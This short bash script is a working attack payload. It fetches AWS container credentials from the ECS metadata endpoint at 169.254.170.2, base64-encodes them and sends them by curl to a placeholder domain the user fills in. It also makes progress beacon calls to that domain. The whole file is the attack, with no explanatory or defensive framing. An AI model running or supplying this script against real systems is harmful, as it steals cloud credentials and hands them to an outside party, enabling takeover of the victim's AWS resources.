#!/bin/bash
domain="<YOUR_DOMAIN>"
curl $domain/?op=executing
payload=$(curl -qL http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
curl $domain/?op=got_payload
curl $domain/?creds=$payload
